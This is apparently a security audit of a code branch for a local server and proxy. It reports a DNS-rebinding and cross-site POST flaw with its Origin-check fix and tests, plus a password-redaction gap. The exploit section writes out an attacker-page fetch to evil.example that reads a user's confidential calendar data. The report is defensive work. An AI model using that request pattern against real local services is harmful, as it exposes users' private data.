# A20: security review of the 2026-11-07 branch

The whole diff `origin/main...claude/lucid-hypatia-v9wqk5` (tip 46a5c0221), read for security. Correctness was covered
by the A5 and A11 hunts ([a5-bugs.md](a5-bugs.md), [a11-bugs.md](a11-bugs.md)); prompt injection against the
candidates packet is A10's. No paid calls. Every finding below has a test that failed before its fix and passes after;
nothing speculative is listed as a finding.

## Findings

### 1. Medium: a web page could use a key-less loopback server or proxy (D351)

**Where.** `packages/server/src/http.ts` (dev mode), `packages/server/src/router.ts` (dev mode, several processes),
`packages/proxy/src/proxy.ts` (no `EDEN_PROXY_KEY`, the loopback default). The proxy is new on this branch; dev mode is
older, but the branch makes it the README's quickstart with real sources and ships a Docker image that listens on
`0.0.0.0` inside the container.

**Exploit.** A developer runs `EDEN_DEV=1 EDEN_USER_SOURCES_FILE=… bun run dev` (or the README's
`docker run -p 127.0.0.1:8790:8790 -e EDEN_DEV=1 eden`) and visits a page. The page's script:

- **DNS rebinding** (reads answers): the attacker's hostname is re-pointed at 127.0.0.1 after the page loads, so
  `fetch("http://evil.example:8790/v1/ask", {method: "POST", body: '{"userId":"me","sessionId":"s","question":"…"}'})`
  is same-origin to the browser and its answer is readable. Reproduced in process: with
  `Origin: http://evil.example:8790` and a `text/plain` body, `/v1/ask` answered 200 with
  `- [calendar] Board meeting with Priya: Thursday 10:00, acquisition terms, confidential`. User ids in a local setup
  are guessable (`me`, the README's examples).
- **Blind cross-site POST** (no rebinding needed): a `text/plain` POST is a CORS "simple" request, sent without a
  preflight, and the handler and proxy parse the body whatever its content type. The page can report events into a
  named user's session (`/v1/events`), `forget` a user, or push items (`/v1/sources/items`).
- **The proxy**: the same, with the request's messages getting the named user's packets. With a key-less upstream
  (a local model server, which `main.ts` lists as an upstream), a rebinding page reads the model's answer, which can
  be told to repeat the context.

**Fix.** Every browser POST carries an `Origin` header (the Fetch standard sets it on every non-GET, non-HEAD
request, same-origin included), and no agent's HTTP client sends one (Bun's and Node's `fetch`, Python's `urllib`,
the OpenAI SDKs). `keylessOriginAllowed` (`@eden/protocol`) allows a missing `Origin` and an `http(s)` origin on this
machine (`localhost`, `127.x.x.x`, `[::1]`, any port, for a local web UI) and refuses the rest, `null` included. A
key-less request it refuses gets a 403: in `createHandler`, in the router before it reads the body (it forwards only
`authorization` and `content-type`, so a child never sees `Origin`), and at the top of the proxy before anything is
read or forwarded. A keyed request is unchanged: a browser cannot send `Authorization` or `x-eden-proxy-key` cross-site
without a CORS grant, and Eden gives none. No new configuration.

**Tests.** `packages/server/src/browser-origin.test.ts`: three foreign origins (`http://evil.example:8790`,
`https://attacker.test`, `null`) 200 before, 403 after, the answer free of the calendar text; three loopback origins,
no Origin, and a keyed request with a foreign Origin, 200 before and after. `router-processes.test.ts` ("audit A20"):
a two-child dev router answered a foreign-origin `/v1/whoami` 200 with the old `router.ts` (the handler fix alone does
not reach it), 403 after. `proxy.test.ts` ("audit A20"): two foreign origins reached the upstream before, 403 and
nothing upstream after; a loopback origin, no Origin, and a keyed proxy with a foreign Origin, 200.

### 2. Low: a passphrase in single or typographic quotes was stored in part (D352)

**Where.** `packages/redact/src/secrets.ts`, `KEYWORD_RULE`. A5's fix (on this branch) took a double-quoted value
whole; single and typographic quotes kept the old `\S{6,}`.

**Exploit.** A mail or note says `my password is 'correct horse battery staple'`; the gate stored
`my password is [REDACTED] horse battery staple'`, so three of the four words were cached, indexed, could be sent to
the card model and handed to the agent in a packet or answer. Same for `“…”` and `‘…’`. (`password: '…'` was already
caught whole by the structural pass.)

**Fix.** The rule takes `'…'`, `“…”` and `‘…’` (4–256 characters inside, no line break) as it takes `"…"`. The quote
must start the value, so an apostrophe later in a sentence is untouched (`the password isn't what Dana's team uses`
keeps `Dana's team`).

**Tests.** `packages/redact/src/keyword-quoted.test.ts` ("audit A20"): 3 of 4 cases failed before, 4 of 4 pass after;
the apostrophe case passes before and after. The redact package: 142 pass.

## Checked and found sound

- **Auth and scoping.** Every new route (`/v1/explain`) takes the tenant from the key and checks `userId` and
  `sessionId` like `/v1/pending`; `explain` reads only `sessions.get(sessionKey(ref))`. `?shadow=1` can only reduce
  what is learned. The router's new per-tenant limiter is keyed by the key's tenant. The proxy compares
  `x-eden-proxy-key` in constant time (D312), checks it before reading a body, refuses to start off loopback without a
  16+ character key, and strips `x-eden-*` and hop-by-hop headers before forwarding.
- **Isolation (D9) in new state.** `acting` and `unverifiable` (partner.ts) are keyed by `scopeKey`; the proxy's
  conversations by `edenId(user)#session` (`edenId` is injective: `_` is escaped, `e:`/`h:` prefixes are re-escaped,
  long ids hashed); the MCP session rotation (D281) keeps the tenant and user; the OAuth example caches tokens per
  tenant/user.
- **SSRF and redirects.** The proxy's target is `EDEN_PROXY_UPSTREAM` plus the request's path; a parsed URL's
  pathname always starts with `/`, so a caller cannot change the host (`//evil`, `@evil` stay in the path). Upstream
  redirects are followed by `fetch` with the caller's own `Authorization` (checked here: Bun 1.4.4's fetch dropped
  `Authorization` on a 307 to another origin). Preset URLs and the token endpoint are the operator's.
- **Read-only (D7).** Presets name only search and list tools and never `trustedReadTools`; `McpSource` checks the
  search, fetch and list tool each against `readOnlyHint` on every connect, after `expandPreset`.
- **Secrets.** No key-shaped string in any added file outside tests (the gate's own rules run over every added or
  changed file; only `eden-keyword` noise and a test key `k_0123456789abcdef`). `.dockerignore` keeps `.env` and
  `.local` at any depth out of the image (A11); the image runs as `bun`, refuses to start without `EDEN_API_KEYS`
  unless `EDEN_DEV=1`. The Python client follows no redirect (A11) and reports route, status and the server's reason
  only. The OAuth example never puts a provider body in an error, and hands Eden only access tokens.
- **Content-free outputs (D56).** `explainTrace` is fixed words and counts; trace reasons are fixed words or a cue id
  (a hash); `itemIds` are `sanitizedId`s; `trace-report` and `digest` read only lines `readTrace` accepts and print
  connector ids that pass `isId` (A11).
- **New text paths and redaction.** Candidate excerpts are items that passed the gate on fetch (`pooledSanitizer`) or
  push; `planConflict`'s quote is `cue.raw`, built from the event text after `sanitizeForStore`, then `safeLine`d with
  its double quotes made single; `CANDIDATES_LEAD`, `PLAN_LEAD` and `ASK_NUDGE` are fixed words.
- **Oversized and padded bodies.** The server and router refuse padded structure before the parse
  (`bodyShapeUnder`, A11) and an over-rate tenant before reading the body.

## What is left (not fixed here)

- **The proxy trusts whoever holds its key, or any local process without one.** It reads a body up to Bun's
  128 MB default (`maxRequestBodySize` is not set) and holds up to 10,000 conversations of up to 2,000 message hashes
  each; a caller can name any user. Bounding these needs a decision on what a legitimate agent sends (images in base64
  make bodies large). Threat model T9 and open item 6.
- **Dev mode beyond loopback** is still a warning, not a refusal (T9, open item 5); D351 covers browsers only.
- **Unquoted multi-word passwords in prose** are not secrets to a pattern (T4).

## Commands

```bash
bun test packages/server/src/browser-origin.test.ts packages/proxy/src/proxy.test.ts   # 23 pass
bun test packages/server/src/router-processes.test.ts -t "A20"                            # 1 pass (0 with old router.ts)
bun test packages/redact                                                                  # 142 pass
```
